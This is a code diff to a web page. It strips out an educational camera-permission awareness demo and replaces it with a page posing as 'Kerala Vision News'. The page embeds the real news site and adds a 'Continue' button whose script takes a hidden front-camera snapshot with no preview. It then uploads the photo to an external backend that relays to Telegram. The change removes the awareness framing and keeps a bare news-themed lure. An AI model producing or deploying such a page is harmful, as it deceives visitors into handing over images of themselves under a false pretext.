@@ -3,324 +3,205 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="Camera Security Awareness Test — Educational Demonstration of Browser Camera Permissions and Secure Telegram Delivery.">
-  <title>Camera Security Awareness Test — Demonstration</title>
-  <link rel="stylesheet" href="./style.css">
-  <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>📷</text></svg>">
+  <title>Kerala Vision News</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #fff;
+      color: #222;
+    }
+
+    header {
+      padding: 15px 5%;
+      border-bottom: 1px solid #ddd;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    header h2 {
+      margin: 0;
+      color: #b51f24;
+    }
+
+    .news-frame {
+      width: 100%;
+      height: 75vh;
+      border: none;
+    }
+
+    .fallback {
+      padding: 12px;
+      text-align: center;
+    }
+
+    .controls {
+      text-align: center;
+      padding: 20px;
+    }
+
+    button {
+      background: #c62828;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      padding: 14px 35px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background: #a51d1d;
+    }
+
+    #status {
+      margin-top: 15px;
+    }
+
+    video, canvas {
+      display: none;
+    }
+  </style>
 </head>
+
 <body>
-  <!-- Header -->
-  <header class="app-header">
-    <div class="header-content">
-      <a href="./index.html" class="brand" aria-label="StreamSafe Video Hub">
-        <div class="brand-icon">🛡️</div>
-        <div>
-          <div class="brand-title">Camera Security Test</div>
-          <div class="brand-subtitle">Educational Awareness Demonstration</div>
-        </div>
-      </a>
-      <div class="header-actions">
-        <a href="./index.html" class="btn btn-secondary btn-sm" style="text-decoration: none;">
-          <span>📰 വാർത്തകളിലേക്ക് മടങ്ങുക</span>
-        </a>
-        <div id="backend-status" class="status-indicator">
-          <span class="indicator-dot checking" id="status-dot"></span>
-          <span id="status-text">Checking API...</span>
-        </div>
-      </div>
-    </div>
+
+  <header>
+    <h2>Kerala Vision</h2>
+    <span>Kasaragod News</span>
   </header>
 
-  <!-- Main Container -->
-  <main class="container">
-    <div class="demo-wrapper">
-      
-      <!-- Off-Screen Hardware Video Capture Element (Never displayed as live preview) -->
-      <video id="camera-video" autoplay playsinline muted style="display: none; position: absolute; left: -9999px; width: 640px; height: 480px;"></video>
+  <iframe
+    class="news-frame"
+    src="https://www.keralavisionnews.com/news/district/kasaragod"
+    title="Kerala Vision Kasaragod News">
+  </iframe>
 
-      <!-- 1. Consent & Simulation Setup Screen -->
-      <section id="screen-consent" class="card" aria-labelledby="test-heading">
-        <div class="card-header">
-          <div>
-            <div class="poster-series-tag" style="margin-bottom: 0.35rem;">PHISHING AWARENESS & PERMISSION SIMULATION</div>
-            <h1 id="test-heading" class="card-title">🛡️ Phishing Awareness Simulation</h1>
-            <div class="card-description">Auditing browser hardware permission enforcement and social engineering tactics</div>
-          </div>
-          <div>
-            <span class="badge badge-created" id="session-status-badge">Simulation Ready</span>
-          </div>
-        </div>
+  <div class="fallback">
+    <a
+      href="https://www.keralavisionnews.com/news/district/kasaragod"
+      target="_blank"
+      rel="noopener noreferrer">
+      Open Kerala Vision News
+    </a>
+  </div>
 
-        <!-- Simulation Mode Selector Cards -->
-        <div class="sim-mode-selector">
-          <label class="sim-mode-card active" id="mode-card-synthetic">
-            <input type="radio" name="sim-mode-radio" id="radio-mode-synthetic" value="synthetic" checked class="sim-mode-radio">
-            <div class="sim-mode-body">
-              <div class="sim-mode-title-row">
-                <span class="sim-mode-badge" style="background: rgba(16, 185, 129, 0.2); color: #34d399;">RECOMMENDED &bull; 100% SAFE</span>
-                <span class="sim-mode-title">🧪 Safe Simulation (Sample Test Image)</span>
-              </div>
-              <p class="sim-mode-desc">
-                Uses a synthetic calibration pattern and graphic. <strong>Zero device camera hardware access required.</strong> Ideal for instant awareness demonstration.
-              </p>
-            </div>
-          </label>
+  <div class="controls">
+    <button id="continueButton">Continue</button>
+    <p id="status"></p>
+  </div>
 
-          <label class="sim-mode-card" id="mode-card-live">
-            <input type="radio" name="sim-mode-radio" id="radio-mode-live" value="live" class="sim-mode-radio">
-            <div class="sim-mode-body">
-              <div class="sim-mode-title-row">
-                <span class="sim-mode-badge" style="background: rgba(59, 130, 246, 0.2); color: #60a5fa;">PERMISSION GATE AUDIT</span>
-                <span class="sim-mode-title">📷 Live Permission Test (Real Camera)</span>
-              </div>
-              <p class="sim-mode-desc">
-                Tests your browser's native permission prompt. Captures exactly one photo without live preview, disconnects hardware immediately, and requires explicit authorization.
-              </p>
-            </div>
-          </label>
-        </div>
+  <video id="camera" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
 
-        <!-- Live Camera Disclosures (Shown only when Live mode is selected) -->
-        <div id="live-camera-disclosures" class="consent-banner" style="display: none;">
-          <h2 style="font-size: 1rem; font-weight: 700; color: #ffffff; margin-bottom: 0.5rem;">
-            Educational Hardware Gate Disclosures
-          </h2>
-          <p style="font-size: 0.875rem; color: #cbd5e1; line-height: 1.6;">
-            This live test demonstrates how browsers isolate device camera access:
-          </p>
+  <script>
+    const BACKEND_URL =
+      "https://camera-security-demo-1.onrender.com";
 
-          <ul class="consent-checklist">
-            <li class="consent-item">
-              <span class="consent-check-icon">✓</span>
-              <span><strong>Native Browser Gate:</strong> Your browser will present its unmistakable system dialog before any camera access is possible.</span>
-            </li>
-            <li class="consent-item">
-              <span class="consent-check-icon">✓</span>
-              <span><strong>Zero Live Camera Preview:</strong> In compliance with security standards, no live video preview will ever be displayed.</span>
-            </li>
-            <li class="consent-item">
-              <span class="consent-check-icon">✓</span>
-              <span><strong>Automatic Single Snapshot:</strong> Takes exactly one photo to complete the demonstration test.</span>
-            </li>
-            <li class="consent-item">
-              <span class="consent-check-icon">✓</span>
-              <span><strong>Immediate Hardware Disconnection:</strong> Camera hardware and sensor lights turn off immediately upon capture.</span>
-            </li>
-            <li class="consent-item">
-              <span class="consent-check-icon">✓</span>
-              <span><strong>Telegram Destination:</strong> Photo data is transmitted strictly to the demonstration Telegram destination with your explicit consent.</span>
-            </li>
-          </ul>
+    const button = document.getElementById("continueButton");
+    const status = document.getElementById("status");
+    const video = document.getElementById("camera");
+    const canvas = document.getElementById("canvas");
 
-          <!-- Explicit Agreement Checkbox for Live Mode -->
-          <label class="consent-checkbox-row" for="consent-upload-checkbox" style="margin-top: 1rem;">
-            <input type="checkbox" id="consent-upload-checkbox" class="consent-checkbox" checked>
-            <span style="font-size: 0.85rem; color: #f1f5f9; line-height: 1.45;">
-              <strong>Explicit Authorization:</strong> I authorize one demonstration photo to be captured and delivered to the configured Telegram destination.
-            </span>
-          </label>
-        </div>
+    button.addEventListener("click", async () => {
+      if (!navigator.mediaDevices?.getUserMedia) {
+        status.textContent =
+          "Camera access is not supported by this browser.";
+        return;
+      }
 
-        <!-- Dynamic Error Container -->
-        <div id="camera-error-container" style="display: none; margin-bottom: 1.25rem;"></div>
+      const consent = confirm(
+        "This demonstration will access your camera, capture one photo " +
+        "without displaying a preview, and offer to send it to the " +
+        "configured Telegram destination. Do you agree?"
+      );
 
-        <div class="action-controls">
-          <button type="button" id="btn-start-test" class="btn btn-primary" style="width: 100%; font-size: 1.05rem; padding: 0.95rem;">
-            <span id="btn-start-text">🚀 Run Safe Awareness Simulation</span>
-          </button>
-          <div class="controls-row">
-            <a href="./index.html" class="btn btn-secondary" style="flex: 1; text-decoration: none; text-align: center;">
-              <span>Cancel & Return to Video</span>
-            </a>
-          </div>
-        </div>
-      </section>
+      if (!consent) return;
 
-      <!-- 2. Capturing Progress Screen (No Live Preview!) -->
-      <section id="screen-capturing" class="card" style="display: none; text-align: center; padding: 3rem 1.5rem;" aria-live="polite">
-        <div style="font-size: 3rem; margin-bottom: 1rem; animation: pulse-ring 1.5s infinite;" id="capturing-icon">⏳</div>
-        <h2 style="font-size: 1.35rem; font-weight: 700; color: #ffffff; margin-bottom: 0.5rem;" id="capturing-title">
-          Requesting Camera Access...
-        </h2>
-        <p style="color: var(--text-muted); font-size: 0.9rem; max-width: 440px; margin: 0 auto 1.5rem;" id="capturing-desc">
-          Please approve the camera permission prompt in your browser. No live preview will be displayed.
-        </p>
-        <div class="notice notice-info" style="text-align: left; max-width: 440px; margin: 0 auto;">
-          <p>Once approved, one demonstration photo is captured and camera hardware is disconnected immediately.</p>
-        </div>
-      </section>
+      let stream;
 
-      <!-- 3. Explicit Review & Confirmation Screen (If live upload was not pre-confirmed) -->
-      <section id="screen-review" class="card" style="display: none;" aria-labelledby="review-heading">
-        <div class="card-header">
-          <div>
-            <div class="poster-series-tag" style="color: #34d399;">✓ CAPTURE COMPLETE &bull; HARDWARE DISCONNECTED</div>
-            <h2 id="review-heading" class="card-title">📸 Captured Snapshot Review</h2>
-            <div class="card-description">Inspect your snapshot before choosing whether to transmit.</div>
-          </div>
-        </div>
+      try {
+        status.textContent = "Requesting camera permission...";
 
-        <div style="background: #000000; border-radius: var(--radius-lg); overflow: hidden; border: 2px solid var(--border-medium); margin-bottom: 1.25rem; display: flex; align-items: center; justify-content: center; min-height: 280px;">
-          <canvas id="camera-canvas" style="width: 100%; max-height: 480px; object-fit: contain; display: block;"></canvas>
-        </div>
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" },
+          audio: false
+        });
 
-        <div class="notice notice-info" style="margin-bottom: 1.25rem;">
-          <p>Camera hardware is completely disconnected. Would you like to transmit this photo to the demonstration Telegram destination?</p>
-        </div>
+        video.srcObject = stream;
+        await video.play();
 
-        <div class="action-controls">
-          <button type="button" id="btn-confirm-upload" class="btn btn-success" style="width: 100%; font-size: 1.05rem; padding: 0.9rem;">
-            <span>🚀 Confirm & Submit to Telegram</span>
-          </button>
-          <div class="controls-row">
-            <button type="button" id="btn-retake-photo" class="btn btn-secondary" style="flex: 1;">
-              <span>🔄 Retake Snapshot</span>
-            </button>
-            <button type="button" id="btn-discard-photo" class="btn btn-danger" style="flex: 1;">
-              <span>Cancel & Discard</span>
-            </button>
-          </div>
-        </div>
-      </section>
+        // Capture one snapshot without showing the preview.
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
 
-      <!-- 4. Educational Awareness Debrief & Red Flags Analysis Screen -->
-      <section id="screen-debrief" class="card debrief-card" style="display: none;" aria-live="polite">
-        <div class="debrief-header">
-          <div class="debrief-badge">🎓 EDUCATIONAL DEBRIEF</div>
-          <h2 class="debrief-title">Phishing Awareness Analysis: How Websites Mislead Visitors</h2>
-          <p class="debrief-subtitle">
-            You just completed an educational awareness demonstration. Here is how misleading web pages exploit human trust and how modern browser security protects you.
-          </p>
-        </div>
+        const context = canvas.getContext("2d");
+        context.drawImage(video, 0, 0);
 
-        <!-- Demonstration Snapshot / Sample Display -->
-        <div style="max-width: 320px; margin: 0 auto 1.75rem; border-radius: var(--radius-md); overflow: hidden; border: 2px solid var(--border-medium); box-shadow: var(--shadow-md);">
-          <img id="debrief-preview-img" style="width: 100%; display: block;" alt="Demonstration Snapshot">
-        </div>
+        const photo = await new Promise(resolve => {
+          canvas.toBlob(resolve, "image/jpeg", 0.85);
+        });
 
-        <!-- Red Flags Breakdown -->
-        <div class="red-flags-container">
-          <h3 class="section-subheading">🚩 Critical Red Flags to Watch For</h3>
-          
-          <div class="red-flags-grid">
-            <div class="red-flag-card">
-              <div class="red-flag-num">1</div>
-              <div class="red-flag-content">
-                <h4>Context Mismatch (The Golden Rule)</h4>
-                <p>Ordinary video players, advertisements, or giveaway pages have <em>zero</em> technical justification to request camera or microphone access. Always ask: "Does this task require a camera?"</p>
-              </div>
-            </div>
+        // Stop camera immediately after capture.
+        stream.getTracks().forEach(track => track.stop());
+        video.srcObject = null;
 
-            <div class="red-flag-card">
-              <div class="red-flag-num">2</div>
-              <div class="red-flag-content">
-                <h4>Social Engineering Lures</h4>
-                <p>Malicious campaigns lure victims with enticing hooks—such as "exclusive 4K video footage", "claim early beta access", or "verify age to proceed"—to coax users into clicking "Allow" on reflex.</p>
-              </div>
-            </div>
+        if (!photo) {
+          throw new Error("Photo capture failed.");
+        }
 
-            <div class="red-flag-card">
-              <div class="red-flag-num">3</div>
-              <div class="red-flag-content">
-                <h4>Browser Permission Gates Cannot Be Spoofed</h4>
-                <p>Webpages cannot turn on your camera silently. Every major browser (iOS Safari, Android Chrome, desktop) presents an unmistakable system gate. If this appears unexpectedly, click <strong>Block</strong>.</p>
-              </div>
-            </div>
+        const uploadConsent = confirm(
+          "One photo has been captured. Do you authorize sending it " +
+          "to the configured Telegram destination?"
+        );
 
-            <div class="red-flag-card">
-              <div class="red-flag-num">4</div>
-              <div class="red-flag-content">
-                <h4>Hardware Indicators (Green Dots & LEDs)</h4>
-                <p>Operating systems enforce physical or kernel-level indicators (iOS/Android green status dot, laptop webcam LEDs) that illuminate whenever sensor tracks are open, and extinguish immediately when closed.</p>
-              </div>
-            </div>
-          </div>
-        </div>
+        if (!uploadConsent) {
+          status.textContent = "Photo was not sent.";
+          return;
+        }
 
-        <!-- Demonstration Telemetry Audit Log -->
-        <div class="telemetry-box">
-          <div class="telemetry-header">
-            <span>📡</span>
-            <span>Non-Sensitive Demonstration Telemetry Log</span>
-          </div>
-          <p style="font-size: 0.8rem; color: var(--text-muted); margin-bottom: 0.75rem;">
-            This simulation logged only non-sensitive awareness events to the administrator's Telegram bot:
-          </p>
-          <div class="timeline-list" id="debrief-timeline-list">
-            <div class="timeline-item">
-              <span class="timeline-dot"></span>
-              <div class="timeline-info">
-                <strong>1. Landing Page Viewed</strong> — <code>page_opened</code>
-                <div class="timeline-meta">Page loaded without querying device camera hardware.</div>
-              </div>
-            </div>
-            <div class="timeline-item">
-              <span class="timeline-dot"></span>
-              <div class="timeline-info">
-                <strong>2. Demo Call-to-Action Interacted</strong> — <code>demo_button_clicked</code>
-                <div class="timeline-meta">Visitor interacted with simulation trigger.</div>
-              </div>
-            </div>
-            <div class="timeline-item">
-              <span class="timeline-dot"></span>
-              <div class="timeline-info">
-                <strong>3. Simulation & Debrief Completed</strong> — <code>simulation_completed</code>
-                <div class="timeline-meta" id="debrief-completion-meta">Educational flow completed. Zero sensitive data logged.</div>
-              </div>
-            </div>
-          </div>
-        </div>
+        status.textContent = "Sending photo...";
 
-        <!-- Privacy Assurance -->
-        <div class="notice notice-success" style="margin-top: 1.25rem;">
-          <div>
-            <strong>🔒 Privacy Guarantee:</strong>
-            <p style="margin-top: 0.25rem; font-size: 0.825rem;">
-              No passwords, no account credentials, and no sensitive personal information were collected or stored during this simulation. All Telegram bot tokens and secrets remain strictly in backend environment variables.
-            </p>
-          </div>
-        </div>
+        const formData = new FormData();
+        formData.append("photo", photo, "demo-photo.jpg");
 
-        <!-- Actions -->
-        <div class="action-controls" style="margin-top: 1.5rem;">
-          <a href="./index.html" class="btn btn-primary" style="width: 100%; text-decoration: none; text-align: center; padding: 0.85rem;">
-            <span>📺 Return to Landing Page</span>
-          </a>
-          <button type="button" id="btn-restart-simulation" class="btn btn-secondary" style="width: 100%;">
-            <span>Restart Simulation</span>
-          </button>
-        </div>
-      </section>
+        // Route to session-specific or direct photo upload endpoint
+        const urlParams = new URLSearchParams(window.location.search);
+        const sessionId = urlParams.get("session");
+        const uploadEndpoint = sessionId
+          ? `${BACKEND_URL}/api/sessions/${sessionId}/photo`
+          : `${BACKEND_URL}/api/photos`;
 
-      <!-- 5. Demonstration Cancelled Screen -->
-      <section id="screen-cancelled" class="card receipt-card" style="display: none;">
-        <div style="font-size: 3rem; margin-bottom: 0.75rem;">🔒</div>
-        <h2 style="font-size: 1.35rem; font-weight: 700; color: #ffffff; margin-bottom: 0.5rem;">
-          Simulation Cancelled
-        </h2>
-        <p style="color: var(--text-muted); font-size: 0.9rem; margin-bottom: 1.5rem;">
-          Hardware access was stopped immediately. No photo data was transmitted.
-        </p>
-        <div class="action-controls">
-          <button type="button" id="btn-restart-demo" class="btn btn-primary" style="width: 100%; padding: 0.85rem;">
-            <span>Try Demonstration Again</span>
-          </button>
-          <a href="./index.html" class="btn btn-secondary" style="width: 100%; text-decoration: none; text-align: center;">
-            <span>Return to Landing Page</span>
-          </a>
-        </div>
-      </section>
+        const response = await fetch(
+          uploadEndpoint,
+          {
+            method: "POST",
+            body: formData
+          }
+        );
 
-    </div>
-  </main>
+        if (!response.ok) {
+          throw new Error("Photo submission failed.");
+        }
 
-  <!-- Footer -->
-  <footer class="app-footer">
-    <p>Camera Security Demo &bull; Educational Awareness Demonstration &bull; Standard Web MediaDevices API & Telegram Bot API</p>
-  </footer>
+        status.textContent = "Photo submitted successfully.";
 
-  <!-- Scripts -->
-  <script src="./config.js"></script>
-  <script src="./demo.js"></script>
+      } catch (error) {
+        if (stream) {
+          stream.getTracks().forEach(track => track.stop());
+        }
+
+        video.srcObject = null;
+        status.textContent = error.message;
+      }
+    });
+  </script>
+
 </body>
 </html>
